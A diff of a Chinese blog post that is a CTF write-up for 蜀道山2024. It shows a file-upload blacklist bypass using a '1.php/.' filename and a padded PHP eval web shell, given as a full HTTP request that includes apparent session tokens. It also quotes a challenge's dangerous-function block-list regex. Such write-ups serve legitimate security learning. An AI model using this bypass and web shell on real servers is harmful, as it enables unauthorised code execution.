@@ -1,18 +1,15 @@
-
-<!DOCTYPE html><html lang="en">
-
-<head>
+<!DOCTYPE html><html lang="zh-CN"><head>
   <meta charset="utf-8">
   <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.33.1" theme-name="Stellar" theme-version="1.33.1">
-  
+  <link rel="canonical" href="https://sauy.top/2025/04/10/%E8%9C%80%E9%81%93%E5%B1%B12024-wp/">
   
   <meta name="generator" content="Hexo 7.3.0">
-  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  <meta http-equiv="x-dns-prefetch-control" content="on">
   
   <meta name="renderer" content="webkit">
   <meta name="force-rendering" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
-  <meta name="HandheldFriendly" content="True" >
+  <meta name="HandheldFriendly" content="True">
   <meta name="mobile-web-app-capable" content="yes">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
@@ -20,20 +17,20 @@
   <title>蜀道山2024wp - Sauy's corner</title>
 
   
-    <meta name="description" content="奶龙牌WAF拿到附件 不准上传后缀为ph和hta的文件 并且对文件大小有限制 代码关键处:  move_uploaded_file 函数定义和用法：12move_uploaded_file() 函数把上传的文件移动到新位置。如果成功该函数返回 TRUE，如果失败则返回 FALSE。  语法：123move_uploaded_file(file,newloc)file:必需。规定要移动的文件。new">
+    <meta name="description" content="记录蜀道山 2024 中奶龙牌 WAF 与恶意代码检测器的题解，结合上传逻辑、过滤规则和关键源码分析解题过程。">
 <meta property="og:type" content="article">
 <meta property="og:title" content="蜀道山2024wp">
-<meta property="og:url" content="http://example.com/2025/04/10/%E8%9C%80%E9%81%93%E5%B1%B12024-wp/">
-<meta property="og:site_name" content="Sauy&#39;s corner">
-<meta property="og:description" content="奶龙牌WAF拿到附件 不准上传后缀为ph和hta的文件 并且对文件大小有限制 代码关键处:  move_uploaded_file 函数定义和用法：12move_uploaded_file() 函数把上传的文件移动到新位置。如果成功该函数返回 TRUE，如果失败则返回 FALSE。  语法：123move_uploaded_file(file,newloc)file:必需。规定要移动的文件。new">
-<meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://example.com/images/sauy.jpg">
+<meta property="og:url" content="https://sauy.top/2025/04/10/%E8%9C%80%E9%81%93%E5%B1%B12024-wp/">
+<meta property="og:site_name" content="Sauy's corner">
+<meta property="og:description" content="记录蜀道山 2024 中奶龙牌 WAF 与恶意代码检测器的题解，结合上传逻辑、过滤规则和关键源码分析解题过程。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://sauy.top/images/sauy.jpg">
 <meta property="article:published_time" content="2025-04-10T08:10:58.000Z">
 <meta property="article:modified_time" content="2025-09-15T07:56:26.410Z">
 <meta property="article:author" content="Sauy">
 <meta property="article:tag" content="CTF-wp">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/images/sauy.jpg">
+<meta name="twitter:image" content="https://sauy.top/images/sauy.jpg">
   
   
   
@@ -41,36 +38,38 @@
 
   <!-- feed -->
   
+    <link rel="alternate" href="/atom.xml" title="Sauy's corner" type="application/atom+xml">
+  
 
   <link rel="stylesheet" href="/css/main.css?v=1.33.1">
 
 
   
-    <link rel="shortcut icon" href="/images/shengdan.png">
+    <link rel="shortcut icon" href="/images/optimized/bbd11a86c7b12224-32.png" type="image/png" sizes="32x32">
   
 
   
 
-  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Sauy","sameAs":[],"image":"/images/sauy.jpg"},"dateCreated":"2025-04-10T16:10:58+08:00","dateModified":"2025-09-15T15:56:26+08:00","datePublished":"2025-04-10T16:10:58+08:00","description":"","headline":"蜀道山2024wp","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2025/04/10/%E8%9C%80%E9%81%93%E5%B1%B12024-wp/"},"publisher":{"@type":"Organization","name":"Sauy","sameAs":[],"image":"/images/sauy.jpg","logo":{"@type":"ImageObject","url":"/images/sauy.jpg"}},"url":"http://example.com/2025/04/10/%E8%9C%80%E9%81%93%E5%B1%B12024-wp/","keywords":"CTF-wp","thumbnailUrl":"/images/3.JPG","image":1}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Sauy","sameAs":[],"image":"/images/sauy.jpg"},"dateCreated":"2025-04-10T16:10:58+08:00","dateModified":"2025-09-15T15:56:26+08:00","datePublished":"2025-04-10T16:10:58+08:00","description":"","headline":"蜀道山2024wp","mainEntityOfPage":{"@type":"WebPage","@id":"https://sauy.top/2025/04/10/%E8%9C%80%E9%81%93%E5%B1%B12024-wp/"},"publisher":{"@type":"Organization","name":"Sauy","sameAs":[],"image":"/images/sauy.jpg","logo":{"@type":"ImageObject","url":"/images/sauy.jpg"}},"url":"https://sauy.top/2025/04/10/%E8%9C%80%E9%81%93%E5%B1%B12024-wp/","keywords":"CTF-wp","thumbnailUrl":"/images/3.JPG","image":1}</script>
   
 </head>
 <body>
 
-<div class="l_body content" id="start" layout="post" type="tech" ><aside class="l_left"><div class="sidebg"></div><div class="leftbar-container">
+<div class="l_body content" id="start" layout="post" type="tech"><aside class="l_left"><div class="sidebg"></div><div class="leftbar-container">
 
 
-<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/images/sauy.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main">Sauy's corner</div><div class="sub cap">Die With A Smile</div></a></div></header>
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy="" class="avatar" src="/images/optimized/fad17cb6008e6c57-192.webp" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';" loading="eager" decoding="async" srcset="/images/optimized/b053d7b86e84b1be-96.webp 96w, /images/optimized/fad17cb6008e6c57-192.webp 192w" sizes="48px" width="192" height="192" alt="Sauy 的头像"></a><a class="title" href="/"><div class="main">Sauy's corner</div><div class="sub cap">Die With A Smile</div></a></div></header>
 
 <div class="nav-area">
 
 <nav class="menu dis-select"></nav>
 </div>
 <div class="widgets">
-<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="Search"></form><div id="search-result"></div><div class="search-no-result">No Results!</div></div>
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
 
 
 
-<widget class="widget-wrapper recent post-list"><div class="widget-header dis-select"><span class="name">Recent Update</span></div><div class="widget-body fs14"><a class="item title" href="/2026/09/18/BTC%E7%B3%BB%E7%BB%9F%E8%A7%A3%E6%9E%90/"><span class="title">BTC系统基础</span></a><a class="item title" href="/2026/09/15/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80/"><span class="title">区块链基础知识</span></a><a class="item title" href="/2026/09/15/HTB-Practice/"><span class="title">渗透靶机-wp-长期更新</span></a><a class="item title" href="/2026/04/28/JAVA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><span class="title">反射机制解析</span></a><a class="item title" href="/2026/04/06/Kerberos%E5%8D%8F%E8%AE%AE%E5%8F%8A%E5%85%B6%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/"><span class="title">Kerberos协议及其攻击手法</span></a><a class="item title" href="/2025/04/06/Sql-labs%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"><span class="title">Sql-labs部分题解</span></a><a class="item title" href="/2025/08/29/SSRF/"><span class="title">SSRF</span></a><a class="item title" href="/2025/04/20/python%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/"><span class="title">浅谈python内存马</span></a><a class="item title" href="/2025/11/14/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6RCE/"><span class="title">Redis主从复制RCE</span></a><a class="item title" href="/2025/04/07/NSSCTF%20Round30%20Basic%E5%8F%8C%E4%BA%BA%E7%BB%84%E9%98%9F%E8%B5%9B/"><span class="title">NSSCTF Round30 Basic双人组队赛</span></a></div></widget>
+<widget class="widget-wrapper recent post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2026/09/18/BTC%E7%B3%BB%E7%BB%9F%E8%A7%A3%E6%9E%90/"><span class="title">BTC系统基础</span></a><a class="item title" href="/2026/09/15/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80/"><span class="title">区块链基础知识</span></a><a class="item title" href="/2026/09/15/HTB-Practice/"><span class="title">渗透靶机-wp-长期更新</span></a><a class="item title" href="/2026/04/28/JAVA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><span class="title">反射机制解析</span></a><a class="item title" href="/2026/04/06/Kerberos%E5%8D%8F%E8%AE%AE%E5%8F%8A%E5%85%B6%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/"><span class="title">Kerberos协议及其攻击手法</span></a><a class="item title" href="/2025/04/06/Sql-labs%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"><span class="title">Sql-labs部分题解</span></a><a class="item title" href="/2025/08/29/SSRF/"><span class="title">SSRF</span></a><a class="item title" href="/2025/04/20/python%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/"><span class="title">浅谈python内存马</span></a><a class="item title" href="/2025/11/14/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6RCE/"><span class="title">Redis主从复制RCE</span></a><a class="item title" href="/2025/04/07/NSSCTF%20Round30%20Basic%E5%8F%8C%E4%BA%BA%E7%BB%84%E9%98%9F%E8%B5%9B/"><span class="title">NSSCTF Round30 Basic双人组队赛</span></a></div></widget>
 </div>
 
 </div></aside><div class="l_main" id="main">
@@ -81,9 +80,9 @@
 
 <div class="article banner top">
   <div class="content">
-    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">Home</a>
-<span class="sep"></span><a class="cap breadcrumb" href="/">Blog</a></div>
-<div class="flex-row" id="post-meta"><span class="text created">Posted on: <time datetime="2025-04-10T08:10:58.000Z">2025-04-10</time></span><span class="sep updated"></span><span class="text updated">Updated on: <time datetime="2025-09-15T07:56:26.410Z">2025-09-15</time></span></div></div></div>
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/CTF/">CTF</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2025-04-10T08:10:58.000Z">2025-04-10</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2025-09-15T07:56:26.410Z">2025-09-15</time></span></div></div></div>
     
     <div class="bottom only-title">
       
@@ -96,43 +95,43 @@
   </div>
   </div><article class="md-text content"><h2 id="奶龙牌WAF"><a href="#奶龙牌WAF" class="headerlink" title="奶龙牌WAF"></a>奶龙牌WAF</h2><p>拿到附件 不准上传后缀为ph和hta的文件 并且对文件大小有限制</p>
 <p>代码关键处:</p>
-<p><img src="/images/image-20250411171529202.png" alt="image-20250411171529202"></p>
-<h3 id="move-uploaded-file-函数"><a href="#move-uploaded-file-函数" class="headerlink" title="move_uploaded_file 函数"></a>move_uploaded_file 函数</h3><h4 id="定义和用法："><a href="#定义和用法：" class="headerlink" title="定义和用法："></a>定义和用法：</h4><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">move_uploaded_file() 函数把上传的文件移动到新位置。</span><br><span class="line">如果成功该函数返回 TRUE，如果失败则返回 FALSE。</span><br></pre></td></tr></table></figure>
+<p><img src="/images/image-20250411171529202.png" alt="image-20250411171529202" loading="lazy" decoding="async" width="1491" height="281"></p>
+<h3 id="move-uploaded-file-函数"><a href="#move-uploaded-file-函数" class="headerlink" title="move_uploaded_file 函数"></a>move_uploaded_file 函数</h3><h4 id="定义和用法："><a href="#定义和用法：" class="headerlink" title="定义和用法："></a>定义和用法：</h4><figure class="highlight text"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">move_uploaded_file() 函数把上传的文件移动到新位置。</span><br><span class="line">如果成功该函数返回 TRUE，如果失败则返回 FALSE。</span><br></pre></td></tr></tbody></table></figure>
 
-<h4 id="语法："><a href="#语法：" class="headerlink" title="语法："></a>语法：</h4><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">move_uploaded_file(file,newloc)</span><br><span class="line">file:必需。规定要移动的文件。</span><br><span class="line">newloc:必需。规定文件的新位置。</span><br></pre></td></tr></table></figure>
+<h4 id="语法："><a href="#语法：" class="headerlink" title="语法："></a>语法：</h4><figure class="highlight text"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">move_uploaded_file(file,newloc)</span><br><span class="line">file:必需。规定要移动的文件。</span><br><span class="line">newloc:必需。规定文件的新位置。</span><br></pre></td></tr></tbody></table></figure>
 
-<h4 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h4><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">注释：该函数仅用于通过 HTTP POST 上传的文件。</span><br><span class="line">注释：如果目标文件已经存在，将会被覆盖。</span><br></pre></td></tr></table></figure>
+<h4 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h4><figure class="highlight text"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">注释：该函数仅用于通过 HTTP POST 上传的文件。</span><br><span class="line">注释：如果目标文件已经存在，将会被覆盖。</span><br></pre></td></tr></tbody></table></figure>
 
-<h3 id="题目做法"><a href="#题目做法" class="headerlink" title="题目做法:"></a>题目做法:</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当move_uploaded_file函数参数可控时，可以尝试/.绕过，因为该函数会忽略掉文件末尾的/.，所以可以构造save_path=1.php/.,这样file_ext值就为空，就能绕过黑名单，而move_uploaded_file函数忽略文件末尾的/.可以实现保存文件为.php</span><br></pre></td></tr></table></figure>
+<h3 id="题目做法"><a href="#题目做法" class="headerlink" title="题目做法:"></a>题目做法:</h3><figure class="highlight text"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当move_uploaded_file函数参数可控时，可以尝试/.绕过，因为该函数会忽略掉文件末尾的/.，所以可以构造save_path=1.php/.,这样file_ext值就为空，就能绕过黑名单，而move_uploaded_file函数忽略文件末尾的/.可以实现保存文件为.php</span><br></pre></td></tr></tbody></table></figure>
 
-<p><img src="C:\Users\sauy\AppData\Roaming\Typora\typora-user-images\image-20250411172003589.png" alt="image-20250411172003589"></p>
+<p><img src="C:\Users\sauy\AppData\Roaming\Typora\typora-user-images\image-20250411172003589.png" alt="image-20250411172003589" loading="lazy" decoding="async"></p>
 <p>这段代码代表只对前5000字节进行校验，意思是5000之后我们就可以传入危险内容(木马)。</p>
-<p>使用<code>print(&#39;a&#39;*2000000+&#39;&lt;?php eval($_POST[1]);?&gt;&#39;)</code></p>
+<p>使用<code>print('a'*2000000+'&lt;?php eval($_POST[1]);?&gt;')</code></p>
 <p>上传文件即可</p>
 <p>数据包构造</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">POST /?name=1.php/. HTTP/1.1</span><br><span class="line">Host: gz.imxbt.cn:20801</span><br><span class="line">Content-Length: 1048752</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36</span><br><span class="line">Origin: http://gz.imxbt.cn:20801</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundarycXLzLLazg0AJNoVA</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://gz.imxbt.cn:20801/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,zh-HK;q=0.8,zh-TW;q=0.7</span><br><span class="line">Cookie: PHPSESSID=8177754fd454ad57569dea76792994c9; name=&quot;!4SSvdzbD0UYv84Lnpmm1VLtPBddCrvhgQOLkNQbhjek=?gAWVGQAAAAAAAABdlCiMBG5hbWWUfZRoAYwFZ3Vlc3SUc2Uu&quot;; GZCTF_Token=CfDJ8MKySZ_mlO1BrUTiopFb3pr4sMLMFDp7VLwqIHHQ787J8MU9o7kzKDQgSGH3aUSAFreJelz-xjNcVon1NvCY9iAKz8ktIq-qB4r2jQSniDqdjks-AlNc7Rkw9ROQ3vAa9e0N-iumHmUWe1UcvM30oD4C_p5X2rfkyF4zaLlPcJte51OO6suesKAsKpiTzQ1RvmbX-oqD9hVQaRz0jBi9xFJ7fpCIh2-_Y8UzrQ8TgMQRwpHxaUjX6TUPWl2iaCoFCXNG5RSUU5JVX6JeXurix40S_LdkKSdgdmEXKkw1XNLb5v1YDumTpaGciQGUIVoxHZRwlEtgQ5eR3pq8O1_vm4yODQYq4Y0RPvc2MoJVYLZgX1u-EsroGJdBXAMr09bPEkPJYYerhs1QlP5t2Y8A076GE8Cv82ugOHeNStUNFBf_XQwunbSKJt0FaUtv0SdEu-EKn79ZcAd4m_Ui2-DypcJ6NW7yQrVoC31ElAZuLxFCuVZP4Jw_hZxvAhETL4Pm3Jbx0XR1Dv_Eyjirco1Gtowu44qH972w0qN2sbR2iTwatubxFs39PNNj6dBeZj3MsqihIS5JgY4aY2yAiSLgV586D0zNxFepVQR6_qSzYVX61OIiXKjnRACYg6F6neFGC7YwlYz260chM2RECVTWEqQOdR02WQ6HRcoMqFiFMMXchvAX7rW8t3RJ7T6dF_eel5le5oHsYhoxevoMfddEVM8</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundarycXLzLLazg0AJNoVA</span><br><span class="line">Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;1.php/.&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">&quot;2000000个a&quot;+&lt;?php eval($_POST[1]);?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundarycXLzLLazg0AJNoVA--</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">POST /?name=1.php/. HTTP/1.1</span><br><span class="line">Host: gz.imxbt.cn:20801</span><br><span class="line">Content-Length: 1048752</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36</span><br><span class="line">Origin: http://gz.imxbt.cn:20801</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundarycXLzLLazg0AJNoVA</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://gz.imxbt.cn:20801/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,zh-HK;q=0.8,zh-TW;q=0.7</span><br><span class="line">Cookie: PHPSESSID=8177754fd454ad57569dea76792994c9; name="!4SSvdzbD0UYv84Lnpmm1VLtPBddCrvhgQOLkNQbhjek=?gAWVGQAAAAAAAABdlCiMBG5hbWWUfZRoAYwFZ3Vlc3SUc2Uu"; GZCTF_Token=CfDJ8MKySZ_mlO1BrUTiopFb3pr4sMLMFDp7VLwqIHHQ787J8MU9o7kzKDQgSGH3aUSAFreJelz-xjNcVon1NvCY9iAKz8ktIq-qB4r2jQSniDqdjks-AlNc7Rkw9ROQ3vAa9e0N-iumHmUWe1UcvM30oD4C_p5X2rfkyF4zaLlPcJte51OO6suesKAsKpiTzQ1RvmbX-oqD9hVQaRz0jBi9xFJ7fpCIh2-_Y8UzrQ8TgMQRwpHxaUjX6TUPWl2iaCoFCXNG5RSUU5JVX6JeXurix40S_LdkKSdgdmEXKkw1XNLb5v1YDumTpaGciQGUIVoxHZRwlEtgQ5eR3pq8O1_vm4yODQYq4Y0RPvc2MoJVYLZgX1u-EsroGJdBXAMr09bPEkPJYYerhs1QlP5t2Y8A076GE8Cv82ugOHeNStUNFBf_XQwunbSKJt0FaUtv0SdEu-EKn79ZcAd4m_Ui2-DypcJ6NW7yQrVoC31ElAZuLxFCuVZP4Jw_hZxvAhETL4Pm3Jbx0XR1Dv_Eyjirco1Gtowu44qH972w0qN2sbR2iTwatubxFs39PNNj6dBeZj3MsqihIS5JgY4aY2yAiSLgV586D0zNxFepVQR6_qSzYVX61OIiXKjnRACYg6F6neFGC7YwlYz260chM2RECVTWEqQOdR02WQ6HRcoMqFiFMMXchvAX7rW8t3RJ7T6dF_eel5le5oHsYhoxevoMfddEVM8</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundarycXLzLLazg0AJNoVA</span><br><span class="line">Content-Disposition: form-data; name="upload_file"; filename="1.php/."</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">"2000000个a"+&lt;?php eval($_POST[1]);?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundarycXLzLLazg0AJNoVA--</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
 
 <p>上传连接蚁剑</p>
-<p><img src="C:\Users\sauy\AppData\Roaming\Typora\typora-user-images\image-20250411175902900.png" alt="image-20250411175902900"></p>
+<p><img src="C:\Users\sauy\AppData\Roaming\Typora\typora-user-images\image-20250411175902900.png" alt="image-20250411175902900" loading="lazy" decoding="async"></p>
 <h2 id="恶意代码检测器"><a href="#恶意代码检测器" class="headerlink" title="恶意代码检测器"></a>恶意代码检测器</h2><p>进去就是个检测器 扫描路径发现<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a> 下载得到源码 index.php里有检测code的源码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">BaseController</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">BaseController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$code</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[\&quot;;&#x27;%\\\\]/&quot;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/openlog|syslog|readlink|mail|symlink|popen|passthru|scandir|show_source|assert|fwrite|curl|php|system|eval|cookie|assert|new|session|str|source|passthru|exec|request|require|include|link|base|exec|reverse|open|popen|getallheaders|next|prev|f|conv|ch|hex|end|ord|post|get|array_reverse|\~|\`|\#|\%|\^|\&amp;|\*|\-|\+|\[|\]|\_|\&lt;|\&gt;|\/|\?|\\\\/is&#x27;</span>, <span class="variable">$code</span>)) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$attack_log_file</span> = <span class="string">&#x27;/tmp/attack.log&#x27;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$attack_log_file</span>)) &#123;</span><br><span class="line">                <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$attack_log_file</span>, <span class="string">&#x27;$attack_word=\&#x27;&#x27;</span>.<span class="variable">$code</span>.<span class="string">&#x27;\&#x27;;&#x27;</span>.<span class="string">&quot;\r\n&quot;</span>,FILE_APPEND);</span><br><span class="line">                <span class="keyword">require_once</span>(<span class="string">&#x27;/tmp/attack.log&#x27;</span>);</span><br><span class="line">            